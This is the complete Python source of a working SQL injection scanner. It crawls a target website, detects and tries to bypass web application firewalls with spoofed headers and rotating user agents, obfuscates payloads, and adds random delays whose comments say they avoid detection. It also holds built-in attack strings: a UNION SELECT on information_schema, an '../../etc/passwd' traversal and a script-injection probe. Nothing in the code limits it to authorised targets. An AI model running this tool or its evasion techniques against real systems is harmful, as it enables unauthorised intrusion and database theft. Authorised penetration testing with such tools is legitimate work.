#!/usr/bin/env python3
import requests
import argparse
import re
import time
import random
import urllib.parse
import json
import os
import logging
import socket
import ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin, urlencode

class SQLInjectionScanner:
    def __init__(self, target_url, payload_file, threads=5, timeout=10, user_agent=None, log_dir="logs", proxy=None, verify_ssl=True):
        self.target_url = target_url
        self.payload_file = payload_file
        self.threads = threads
        self.timeout = timeout
        self.visited_urls = set()
        self.vulnerable_urls = []
        self.payloads = []
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        self.proxies = {}
        if proxy:
            self.proxies = {"http": proxy, "https": proxy}
        self.verify_ssl = verify_ssl
        
        # WAF bypass techniques expanded
        self.waf_bypasses = {
            'cloudflare': [
                {'X-Forwarded-For': '127.0.0.1'},
                {'X-Forwarded-Host': 'localhost'},
                {'X-Host': 'localhost'},
                {'X-Custom-IP-Authorization': '127.0.0.1'},
                {'CF-Connecting-IP': '127.0.0.1'},
                {'X-Original-URL': '/admin/console'},
                {'X-Rewrite-URL': '/admin/console'},
                {'X-Client-IP': '127.0.0.1'}
            ],
            'akamai': [
                {'X-Country-Code': 'US'},
                {'X-Originating-IP': '127.0.0.1'},
                {'True-Client-IP': '127.0.0.1'}
            ],
            'aws_waf': [
                {'X-Forwarded-For': '127.0.0.1, 127.0.0.2, 127.0.0.3'},
                {'X-Forwarded-Proto': 'https'},
                {'X-API-Version': 'null'}
            ],
            'modsecurity': [
                {'X-Forwarded-For': '127.0.0.1'},
                {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                {'Content-Type': 'application/json'}
            ],
            'generic': [
                {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
                {'X-Originating-IP': '127.0.0.1'},
                {'X-Remote-IP': '127.0.0.1'},
                {'X-Remote-Addr': '127.0.0.1'},
                {'X-ProxyUser-Ip': '127.0.0.1'},
                {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'},
                {'Accept-Language': 'en-US,en;q=0.9'},
                {'Accept-Encoding': 'gzip, deflate, br'}
            ]
        }
        
        # Payload encoding techniques
        self.encoding_techniques = [
            lambda p: p,  # No encoding
            lambda p: urllib.parse.quote(p),  # URL encoding
            lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # Double URL encoding
            lambda p: ''.join(f'%{ord(c):02x}' for c in p),  # Hex encoding
            lambda p: p.replace(' ', '/**/')  # Comment injection
        ]
        
        # Setup logging
        self.log_dir = log_dir
        self.setup_logging()
        
    def setup_logging(self):
        """Set up logging directories and files"""
        # Create timestamp for log files
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = urlparse(self.target_url).netloc.replace(":", "_")
        
        # Create log directory if it doesn't exist
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
            
        # Create scan-specific directory
        self.scan_log_dir = os.path.join(self.log_dir, f"{domain}_{timestamp}")
        os.makedirs(self.scan_log_dir)
        
        # Set up file logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(self.scan_log_dir, 'scan.log')),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger('sqli_scanner')
        self.logger.info(f"Starting scan of {self.target_url}")
        self.logger.info(f"Logs will be saved to {self.scan_log_dir}")
        
        # Create specific log files
        self.crawled_urls_file = os.path.join(self.scan_log_dir, 'crawled_urls.txt')
        self.parameters_file = os.path.join(self.scan_log_dir, 'parameters.json')
        self.forms_file = os.path.join(self.scan_log_dir, 'forms.json')
        self.vulnerabilities_file = os.path.join(self.scan_log_dir, 'vulnerabilities.json')
        self.payloads_file = os.path.join(self.scan_log_dir, 'payloads.txt')
        
        # Log files for payload testing
        self.payload_tests_dir = os.path.join(self.scan_log_dir, 'payload_tests')
        os.makedirs(self.payload_tests_dir)
        
    def load_payloads(self):
        """Load SQL injection payloads from file and add advanced payloads"""
        try:
            with open(self.payload_file, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
                
            self.logger.info(f"Loaded {len(self.payloads)} payloads from file")
            
            # Save payloads to log directory
            with open(self.payloads_file, 'w', encoding='utf-8') as f:
                for payload in self.payloads:
                    f.write(f"{payload}\n")
                    
        except Exception as e:
            self.logger.error(f"Error loading payload file: {e}")
            exit(1)
            
    def detect_server_info(self):
        """Detect server information to customize attacks"""
        self.logger.info("Detecting server information...")
        
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=self.timeout, 
                                  proxies=self.proxies, verify=self.verify_ssl)
            
            server_info = {}
            # Check server header
            if 'Server' in response.headers:
                server_info['server'] = response.headers['Server']
                self.logger.info(f"Server: {response.headers['Server']}")
                
            # Check for common headers
            for header in ['X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version', 'X-Runtime']:
                if header in response.headers:
                    server_info[header] = response.headers[header]
                    self.logger.info(f"{header}: {response.headers[header]}")
            
            # Try to identify technology from response
            if 'php' in response.text.lower() or '.php' in response.text.lower():
                server_info['tech'] = 'PHP'
            elif 'asp.net' in response.text.lower():
                server_info['tech'] = 'ASP.NET'
            elif 'jdbc' in response.text.lower():
                server_info['tech'] = 'Java/JDBC'
            
            return server_info
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error detecting server info: {e}")
            return {}
    
    def detect_waf(self):
        """Detect if the website is protected by a WAF using multiple detection techniques"""
        self.logger.info("Checking for WAF/protection systems...")
        
        # List of WAF fingerprints
        waf_signatures = {
            'cloudflare': ['cloudflare', '__cfduid', 'cf-ray', 'cf_clearance'],
            'akamai': ['akamai', 'ak_bmsc', 'bm_sv'],
            'aws_waf': ['aws', 'awselb', 'x-amz'],
            'imperva': ['incapsula', '_incapsula', 'visid_incap'],
            'f5_bigip': ['BigIP', 'F5', 'TS', 'BIGipServer'],
            'fortinet': ['fortigate', 'FORTIWAFSID'],
            'barracuda': ['barracuda', 'barra_counter_session'],
            'modsecurity': ['modsecurity', 'mod_security', 'OWASP CRS'],
            'wordfence': ['wordfence', 'wfvt_']
        }
        
        # Try multiple test payloads
        test_payloads = [
            "' OR '1'='1",
            "1 OR 1=1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1--"
        ]
        
        detected_wafs = []
        
        for payload in test_payloads:
            try:
                # Create different versions of test URL
                if '?' in self.target_url:
                    test_url = f"{self.target_url}&id={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{self.target_url}?id={urllib.parse.quote(payload)}"
                
                response = requests.get(
                    test_url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=self.verify_ssl,
                    allow_redirects=False  # Don't follow redirects to better detect WAF behavior
                )
                
                # Check status codes
                if response.status_code in [403, 406, 429, 503]:
                    self.logger.warning(f"Potential WAF detected - Response code: {response.status_code}")
                    
                # Check for WAF signatures in headers and cookies
                for waf_name, signatures in waf_signatures.items():
                    # Check in headers
                    headers_str = str(response.headers).lower()
                    if any(sig.lower() in headers_str for sig in signatures):
                        self.logger.warning(f"{waf_name.title()} WAF detected in headers")
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)
                            
                    # Check in cookies
                    cookies_str = str(response.cookies).lower()
                    if any(sig.lower() in cookies_str for sig in signatures):
                        self.logger.warning(f"{waf_name.title()} WAF detected in cookies")
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)
                
                # Check content for WAF indications
                content_signatures = [
                    "firewall", "unauthorized", "blocked", "security", "illegal", 
                    "please contact", "your request was blocked", "your access has been blocked",
                    "your ip", "security policy", "security reasons", "security breach",
                    "attack detected", "abnormal activity", "bot detected", "captcha",
                    "security check"
                ]
                
                content_lower = response.text.lower()
                if any(sig in content_lower for sig in content_signatures):
                    self.logger.warning("Generic security system/WAF detected in response content")
                    if "generic" not in detected_wafs:
                        detected_wafs.append("generic")
                
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error during WAF detection with payload {payload}: {e}")
                continue
        
        if not detected_wafs:
            self.logger.info("No WAF detected")
            return False
        else:
            return detected_wafs[0] if detected_wafs else "generic"  # Return the first detected WAF
    
    def bypass_waf(self, waf_type):
        """Attempt to bypass detected WAF using multiple techniques"""
        self.logger.info(f"Attempting to bypass {waf_type} WAF...")
        
        # Add random delays to avoid rate limiting
        time.sleep(random.uniform(1, 3))
        
        # Try user-agent rotation
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ]
        
        # Try all bypass techniques for the detected WAF
        success = False
        
        if waf_type in self.waf_bypasses:
            # Try different bypass techniques
            for bypass in self.waf_bypasses[waf_type]:
                new_headers = self.headers.copy()
                new_headers.update(bypass)
                
                # Try different user agents
                for ua in user_agents:
                    new_headers['User-Agent'] = ua
                    
                    try:
                        # Add delay between requests
                        time.sleep(random.uniform(1, 2))
                        
                        response = requests.get(
                            self.target_url, 
                            headers=new_headers, 
                            timeout=self.timeout,
                            proxies=self.proxies,
                            verify=self.verify_ssl
                        )
                        
                        if response.status_code == 200:
                            self.logger.info(f"WAF bypass may be successful with: {bypass} and User-Agent: {ua}")
                            self.headers = new_headers
                            success = True
                            break
                    except requests.exceptions.RequestException:
                        continue
                
                if success:
                    break
        
        # Try generic bypass if specific WAF bypasses failed
        if not success:
            for bypass in self.waf_bypasses['generic']:
                new_headers = self.headers.copy()
                new_headers.update(bypass)
                
                try:
                    time.sleep(random.uniform(1, 2))
                    
                    response = requests.get(
                        self.target_url, 
                        headers=new_headers, 
                        timeout=self.timeout,
                        proxies=self.proxies,
                        verify=self.verify_ssl
                    )
                    
                    if response.status_code == 200:
                        self.logger.info(f"Generic WAF bypass may be successful with: {bypass}")
                        self.headers = new_headers
                        success = True
                        break
                except requests.exceptions.RequestException:
                    continue
        
        if not success:
            self.logger.warning("Could not bypass WAF completely, but continuing scan with precautions")
            # Add delay between requests to avoid rate limiting
            time.sleep(random.uniform(2, 3))
        
        return success
    
    def crawl_website(self):
        """Crawl the website to find all URLs using advanced crawling techniques"""
        self.logger.info(f"Crawling website: {self.target_url}")
        
        urls_to_visit = [self.target_url]
        forms_found = []
        cookies = {}
        
        # Extract cookies from initial page for authenticated crawling
        try:
            response = requests.get(
                self.target_url, 
                headers=self.headers, 
                timeout=self.timeout,
                proxies=self.proxies,
                verify=self.verify_ssl
            )
            cookies = response.cookies
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error accessing target URL: {e}")
        
        while urls_to_visit and len(self.visited_urls) < 150:  # Increased limit for more thorough crawling
            url = urls_to_visit.pop(0)
            if url in self.visited_urls:
                continue
                
            try:
                self.logger.info(f"Crawling: {url}")
                self.visited_urls.add(url)
                
                # Random delay to avoid detection
                time.sleep(random.uniform(0.5, 1.5))
                
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    cookies=cookies,
                    timeout=self.timeout,
                    proxies=self.proxies,
                    verify=self.verify_ssl
                )
                
                if response.status_code != 200:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all(['a', 'link'], href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    # Stay on the same domain
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc and full_url not in self.visited_urls:
                        if not full_url.endswith(('.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.pdf')):
                            urls_to_visit.append(full_url)
                
                # Extract URLs from JavaScript
                js_patterns = [
                    r'href=[\'"](.*?)[\'"]',
                    r'url:\s*[\'"](.*?)[\'"]',
                    r'window\.location\s*=\s*[\'"](.*?)[\'"]',
                    r'ajax\(\s*[\'"](.*?)[\'"]',
                    r'fetch\([\'"](.*?)[\'"]'
                ]
                
                for pattern in js_patterns:
                    for match in re.finditer(pattern, response.text):
                        js_url = match.group(1)
                        full_js_url = urljoin(url, js_url)
                        if urlparse(full_js_url).netloc == urlparse(self.target_url).netloc and full_js_url not in self.visited_urls:
                            if not full_js_url.endswith(('.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.pdf')):
                                urls_to_visit.append(full_js_url)
                
                # Find all forms
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    form_url = urljoin(url, action) if action else url
                    
                    # Collect all inputs including hidden ones
                    inputs = []
                    for input_field in form.find_all(['input', 'textarea', 'select']):
                        input_name = input_field.get('name')
                        if input_name:
                            inputs.append(input_name)
                    
                    if inputs:
                        forms_found.append({
                            'url': form_url,
                            'method': method,
                            'inputs': inputs,
                            'source_url': url  # Track the page where the form was found
                        })
                        
                # Find all URLs with parameters in the current page
                param_pattern = re.compile(r'href=[\'"]([^\'"]*\?[^\'"]*)[\'"]')
                for match in param_pattern.finditer(response.text):
                    param_url = match.group(1)
                    full_param_url = urljoin(url, param_url)
                    if urlparse(full_param_url).netloc == urlparse(self.target_url).netloc:
                        urls_to_visit.append(full_param_url)
                
                # Find potential AJAX endpoints
                ajax_pattern = re.compile(r'(api/|service/|ajax/|json/|rpc/|\?callback=)[^\s\'"]+')
                for match in ajax_pattern.finditer(response.text):
                    ajax_url = match.group(0)
                    full_ajax_url = urljoin(url, ajax_url)
                    if urlparse(full_ajax_url).netloc == urlparse(self.target_url).netloc:
                        urls_to_visit.append(full_ajax_url)
                
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error crawling {url}: {e}")
                continue
        
        # Save crawled URLs to file
        with open(self.crawled_urls_file, 'w', encoding='utf-8') as f:
            for url in self.visited_urls:
                f.write(f"{url}\n")
        
        # Save discovered forms
        with open(self.forms_file, 'w', encoding='utf-8') as f:
            json.dump(forms_found, f, indent=4)
        
        self.logger.info(f"Crawled {len(self.visited_urls)} URLs and found {len(forms_found)} forms")
        
        return forms_found
    
    def extract_parameters(self):
        """Extract parameters from URLs for testing"""
        self.logger.info("Extracting parameters from URLs...")
        
        parameters = {}
        
        for url in self.visited_urls:
            # Check if URL has parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                parameters[url] = list(query_params.keys())
        
        # Save parameters to file
        with open(self.parameters_file, 'w', encoding='utf-8') as f:
            json.dump(parameters, f, indent=4)
        
        self.logger.info(f"Found {len(parameters)} URLs with parameters")
        
        return parameters
    
    def test_url(self, url, param, payload, encoding_func, test_id):
        """Test a single URL parameter for SQL injection vulnerability"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # Apply encoding to payload
        encoded_payload = encoding_func(payload)
        
        # Create modified URL with payload
        modified_params = query_params.copy()
        modified_params[param] = [encoded_payload]
        
        # Rebuild query string
        modified_query = urlencode(modified_params, doseq=True)
        
        # Rebuild URL
        modified_url_parts = list(parsed_url)
        modified_url_parts[4] = modified_query
        modified_url = urllib.parse.urlunparse(modified_url_parts)
        
        # Random delay to avoid detection
        time.sleep(random.uniform(0.5, 1.5))
        
        self.logger.info(f"Testing URL: {modified_url}")
        
        try:
            start_time = time.time()
            response = requests.get(
                modified_url, 
                headers=self.headers, 
                timeout=self.timeout,
                proxies=self.proxies,
                verify=self.verify_ssl
            )
            response_time = time.time() - start_time
            
            # Log test details
            test_log = {
                'url': url,
                'parameter': param,
                'payload': payload,
                'encoded_payload': encoded_payload,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'timestamp': datetime.now().isoformat()
            }
            
            # Save test log
            with open(os.path.join(self.payload_tests_dir, f'test_{test_id}.json'), 'w', encoding='utf-8') as f:
                json.dump(test_log, f, indent=4)
            
            # Check for SQL error messages
            sql_errors = [
                "sql syntax", "syntax error", "mysql", "postgresql", 
                "oracle", "microsoft sql server", "sqlite", "division by zero",
                "sqlstate", "microsoft ole db", "jdbc", "odbc", "syntax error"
            ]
            
            is_vulnerable = False
            vulnerability_type = None
            
            # Check for error-based injection
            if any(error in response.text.lower() for error in sql_errors):
                is_vulnerable = True
                vulnerability_type = "Error-based SQL Injection"
                
            # Check for time-based injection
            if response_time > 5 and ("sleep" in payload.lower() or "benchmark" in payload.lower() or "delay" in payload.lower() or "pg_sleep" in payload.lower()):
                is_vulnerable = True
                vulnerability_type = "Time-based SQL Injection"
                
            # Check for boolean-based injection
            if "1=1" in payload and "1=2" not in payload and response.status_code == 200:
                # Compare with a negative test
                negative_payload = payload.replace("1=1", "1=2")
                modified_params[param] = [encoding_func(negative_payload)]
                modified_query = urlencode(modified_params, doseq=True)
                modified_url_parts[4] = modified_query
                negative_url = urllib.parse.urlunparse(modified_url_parts)
                
                try:
                    negative_response = requests.get(
                        negative_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        proxies=self.proxies,
                        verify=self.verify_ssl
                    )
                    
                    if negative_response.status_code != 200 or negative_response.text != response.text:
                        is_vulnerable = True
                        vulnerability_type = "Boolean-based SQL Injection"
                        
                except requests.exceptions.RequestException:
                    pass
            
            if is_vulnerable:
                self.logger.warning(f"Potential {vulnerability_type} found: {url} (Parameter: {param}, Payload: {payload})")
                return {
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'vulnerability_type': vulnerability_type,
                    'evidence': response.text[:1000] if "Error-based" in vulnerability_type else f"Response time: {response_time}" if "Time-based" in vulnerability_type else "Different response with 1=1 vs 1=2"
                }
                
            return None
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error testing URL {modified_url}: {e}")
            return None
    
    def test_form(self, form, payload, encoding_func, test_id):
        """Test a form for SQL injection vulnerability"""
        url = form['url']
        method = form['method']
        inputs = form['inputs']
        
        self.logger.info(f"Testing form at {url} with method {method}")
        
        # Random delay to avoid detection
        time.sleep(random.uniform(0.5, 1.5))
        
        for input_field in inputs:
            # Create form data with payload in current field
            form_data = {field: "test" for field in inputs}
            form_data[input_field] = encoding_func(payload)
            
            try:
                start_time = time.time()
                if method == 'get':
                    response = requests.get(
                        url, 
                        params=form_data,
                        headers=self.headers, 
                        timeout=self.timeout,
                        proxies=self.proxies,
                        verify=self.verify_ssl
                    )
                else:  # POST method
                    response = requests.post(
                        url, 
                        data=form_data,
                        headers=self.headers, 
                        timeout=self.timeout,
                        proxies=self.proxies,
                        verify=self.verify_ssl
                    )
                    
                response_time = time.time() - start_time
                
                # Log test details
                test_log = {
                    'url': url,
                    'method': method,
                    'input_field': input_field,
                    'payload': payload,
                    'encoded_payload': encoding_func(payload),
                    'status_code': response.status_code,
                    'response_time': response_time,
                    'response_length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                
                # Save test log
                with open(os.path.join(self.payload_tests_dir, f'form_test_{test_id}.json'), 'w', encoding='utf-8') as f:
                    json.dump(test_log, f, indent=4)
                
                # Check for SQL error messages
                sql_errors = [
                    "sql syntax", "syntax error", "mysql", "postgresql", 
                    "oracle", "microsoft sql server", "sqlite", "division by zero",
                    "sqlstate", "microsoft ole db", "jdbc", "odbc", "syntax error"
                ]
                
                is_vulnerable = False
                vulnerability_type = None
                
                # Check for error-based injection
                if any(error in response.text.lower() for error in sql_errors):
                    is_vulnerable = True
                    vulnerability_type = "Error-based SQL Injection"
                    
                # Check for time-based injection
                if response_time > 5 and ("sleep" in payload.lower() or "benchmark" in payload.lower() or "delay" in payload.lower() or "pg_sleep" in payload.lower()):
                    is_vulnerable = True
                    vulnerability_type = "Time-based SQL Injection"
                    
                # Check for boolean-based injection by comparing responses
                if "1=1" in payload and "1=2" not in payload and response.status_code == 200:
                    # Create a negative test with 1=2 instead of 1=1
                    negative_form_data = form_data.copy()
                    negative_form_data[input_field] = encoding_func(payload.replace("1=1", "1=2"))
                    
                    try:
                        if method == 'get':
                            negative_response = requests.get(
                                url, 
                                params=negative_form_data,
                                headers=self.headers, 
                                timeout=self.timeout,
                                proxies=self.proxies,
                                verify=self.verify_ssl
                            )
                        else:  # POST method
                            negative_response = requests.post(
                                url, 
                                data=negative_form_data,
                                headers=self.headers, 
                                timeout=self.timeout,
                                proxies=self.proxies,
                                verify=self.verify_ssl
                            )
                            
                        if negative_response.status_code != 200 or negative_response.text != response.text:
                            is_vulnerable = True
                            vulnerability_type = "Boolean-based SQL Injection"
                            
                    except requests.exceptions.RequestException:
                        pass
                
                if is_vulnerable:
                    self.logger.warning(f"Potential {vulnerability_type} found in form at {url} (Field: {input_field}, Payload: {payload})")
                    return {
                        'url': url,
                        'method': method,
                        'input_field': input_field,
                        'payload': payload,
                        'vulnerability_type': vulnerability_type,
                        'evidence': response.text[:1000] if "Error-based" in vulnerability_type else f"Response time: {response_time}" if "Time-based" in vulnerability_type else "Different response with 1=1 vs 1=2"
                    }
                    
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Error testing form at {url}: {e}")
                
        return None
    
    def scan_parameters(self, parameters):
        """Scan all parameters for SQL injection vulnerabilities"""
        self.logger.info("Testing parameters for SQL injection vulnerabilities...")
        
        test_id = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for url, params in parameters.items():
                for param in params:
                    for payload in self.payloads:
                        for encoding_func in self.encoding_techniques:
                            test_id += 1
                            futures.append(
                                executor.submit(
                                    self.test_url, 
                                    url, 
                                    param, 
                                    payload, 
                                    encoding_func, 
                                    test_id
                                )
                            )
            
            for future in futures:
                result = future.result()
                if result:
                    self.vulnerable_urls.append(result)
        
        self.logger.info(f"Found {len(self.vulnerable_urls)} vulnerable parameter(s)")
        
    def scan_forms(self, forms):
        """Scan all forms for SQL injection vulnerabilities"""
        self.logger.info("Testing forms for SQL injection vulnerabilities...")
        
        test_id = 0
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for form in forms:
                for payload in self.payloads:
                    for encoding_func in self.encoding_techniques:
                        test_id += 1
                        futures.append(
                            executor.submit(
                                self.test_form, 
                                form, 
                                payload, 
                                encoding_func, 
                                test_id
                            )
                        )
            
            for future in futures:
                result = future.result()
                if result:
                    self.vulnerable_urls.append(result)
        
        self.logger.info(f"Found {len(self.vulnerable_urls)} vulnerable form(s)")
    
    def generate_report(self):
        """Generate a report of the scan results"""
        self.logger.info("Generating scan report...")
        
        # Save vulnerabilities to file
        with open(self.vulnerabilities_file, 'w', encoding='utf-8') as f:
            json.dump(self.vulnerable_urls, f, indent=4)
        
        # Generate summary report
        summary = {
            'scan_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'target_url': self.target_url,
            'urls_crawled': len(self.visited_urls),
            'vulnerabilities_found': len(self.vulnerable_urls),
            'vulnerability_types': {}
        }
        
        for vuln in self.vulnerable_urls:
            vuln_type = vuln.get('vulnerability_type', 'Unknown')
            if vuln_type in summary['vulnerability_types']:
                summary['vulnerability_types'][vuln_type] += 1
            else:
                summary['vulnerability_types'][vuln_type] = 1
        
        # Save summary to file
        with open(os.path.join(self.scan_log_dir, 'summary.json'), 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=4)
        
        self.logger.info("Scan complete!")
        self.logger.info(f"Crawled {summary['urls_crawled']} URLs")
        self.logger.info(f"Found {summary['vulnerabilities_found']} vulnerabilities")
        
        for vuln_type, count in summary['vulnerability_types'].items():
            self.logger.info(f"- {vuln_type}: {count}")
        
        self.logger.info(f"Full report saved to {self.scan_log_dir}")
        
        return summary
    
    def scan(self):
        """Perform full scan of the target"""
        # Load payloads
        self.load_payloads()
        
        # Detect server information
        server_info = self.detect_server_info()
        
        # Detect and attempt to bypass WAF
        waf_type = self.detect_waf()
        if waf_type:
            self.bypass_waf(waf_type)
        
        # Crawl website
        forms = self.crawl_website()
        
        # Extract parameters
        parameters = self.extract_parameters()
        
        # Scan parameters
        if parameters:
            self.scan_parameters(parameters)
        
        # Scan forms
        if forms:
            self.scan_forms(forms)
        
        # Generate report
        return self.generate_report()

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--payloads', required=True, help='File containing SQL injection payloads')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('--log-dir', default='logs', help='Directory to store logs (default: logs)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--no-verify-ssl', action='store_false', dest='verify_ssl', 
                        help='Disable SSL certificate verification')
    parser.add_argument('--version', action='version', version='SQL Injection Scanner v1.0')
    
    args = parser.parse_args()
    
    try:
        scanner = SQLInjectionScanner(
            target_url=args.url,
            payload_file=args.payloads,
            threads=args.threads,
            timeout=args.timeout,
            user_agent=args.user_agent,
            log_dir=args.log_dir,
            proxy=args.proxy,
            verify_ssl=args.verify_ssl
        )
        
        # Start the scan
        summary = scanner.scan()
        
        # Exit with status code based on vulnerabilities found
        if summary['vulnerabilities_found'] > 0:
            return 1
        else:
            return 0
            
    except KeyboardInterrupt:
        print("\nScan interrupted by user. Exiting...")
        return 2
    except Exception as e:
        print(f"An error occurred: {e}")
        return 3

if __name__ == "__main__":
    exit(main())
